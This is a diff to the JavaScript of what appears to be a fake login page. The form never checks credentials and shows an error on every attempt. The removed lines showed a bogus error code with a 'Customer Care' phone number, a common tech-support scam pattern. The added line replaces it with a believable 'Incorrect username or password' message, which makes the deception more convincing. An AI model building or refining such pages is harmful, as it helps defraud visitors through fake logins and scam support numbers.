@@ -192,22 +192,21 @@
             }
         }
 
-        // Show error message on every login attempt
+        // Show error message on login attempt
         function showErrorMessage() {
             const errorMessage = document.getElementById('error-message');
-            errorMessage.textContent = 'Error code : 00X470089
-Contact Customer Care : +1-844-499-1812';
+            errorMessage.textContent = 'Incorrect username or password. Please try again.';
         }
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault();
 
-            // Save the username if remember is checked
-            saveUsername();
-
             // Show error message every time login is attempted
             showErrorMessage();
+
+            // Save the username if remember is checked
+            saveUsername();
         });
 
         // Load remembered username on page load
